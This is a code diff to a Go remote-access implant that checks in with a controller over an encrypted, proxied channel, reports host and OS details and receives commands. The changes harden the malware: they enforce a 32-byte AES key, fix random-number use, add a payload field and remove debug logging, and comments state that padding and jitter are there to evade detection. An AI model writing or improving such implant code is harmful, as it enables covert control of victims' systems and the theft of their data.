@@ -2,8 +2,17 @@ package main
 
 import (
 	"bufio"
+	"crypto/aes"
+	"crypto/cipher"
+	crand "crypto/rand"
+	"crypto/sha256"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
+	mrand "math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -11,26 +20,35 @@ import (
 	"time"
 
 	"golang.org/x/net/proxy"
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
-	"crypto/tls"
-	"encoding/base64"
-	"io"
 )
 
-var sharedKeyString string // Injected via ldflags
+var sharedKeyString string // Injected via ldflags: -X main.sharedKeyString=<32-byte-hex>
 var sharedKey []byte
 
 func init() {
-	sharedKey = []byte(sharedKeyString)
+	k := []byte(sharedKeyString)
+	// AES-256 requires exactly 32 bytes. Pad or truncate to enforce this.
+	// A zero-length key means ldflags injection was skipped — agent will refuse to run.
+	switch {
+	case len(k) == 0:
+		fmt.Fprintln(os.Stderr, "[FATAL] No shared key injected. Rebuild with -ldflags '-X main.sharedKeyString=<key>'.")
+		os.Exit(1)
+	case len(k) < 32:
+		padded := make([]byte, 32)
+		copy(padded, k)
+		sharedKey = padded
+	case len(k) > 32:
+		sharedKey = k[:32]
+	default:
+		sharedKey = k
+	}
 }
 
 func encrypt(data []byte) string {
 	// Pad buffer to normalize packet size and evade heuristic analysis
 	padSize := 256 - (len(data) % 256)
 	padding := make([]byte, padSize)
-	rand.Read(padding)
+	crand.Read(padding)
 	
 	payload := append(data, '|' )
 	payload = append(payload, padding...)
@@ -38,7 +56,7 @@ func encrypt(data []byte) string {
 	block, _ := aes.NewCipher(sharedKey)
 	gcm, _ := cipher.NewGCM(block)
 	nonce := make([]byte, gcm.NonceSize())
-	io.ReadFull(rand.Reader, nonce)
+	io.ReadFull(crand.Reader, nonce)
 	ct := gcm.Seal(nonce, nonce, payload, nil)
 	return base64.StdEncoding.EncodeToString(ct)
 }
@@ -69,6 +87,7 @@ type Packet struct {
 	OS          string `json:"os"`
 	Hostname    string `json:"host"`
 	Output      string `json:"output,omitempty"`
+	Payload     string `json:"payload,omitempty"`
 }
 
 func getShadowID() string {
@@ -101,7 +120,7 @@ func main() {
 
 	for {
 		// Add randomized execution delay to evade traffic pattern analysis
-		jitter := time.Duration(rand.Intn(30)) * time.Second
+		jitter := time.Duration(mrand.Intn(30)) * time.Second
 		time.Sleep(jitter)
 
 		var conn net.Conn
@@ -136,7 +155,7 @@ func main() {
 
 		// Initial Check-in (Handshake with Challenge)
 		challenge := make([]byte, 32)
-		io.ReadFull(rand.Reader, challenge)
+		io.ReadFull(crand.Reader, challenge)
 		
 		checkin := Packet{
 			Type:        "ghost_checkin",
@@ -157,10 +176,7 @@ func main() {
 			// Attempt to decrypt
 			decrypted := decrypt(line)
 			if decrypted == nil {
-				fmt.Printf("[DEBUG] Decryption failed for line: %s\n", line)
-				decrypted = []byte(line)
-			} else {
-				fmt.Printf("[DEBUG] Decrypted: %s\n", string(decrypted))
+				continue // ignore unrecognized or malformed frames
 			}
 
 			var cmd Command
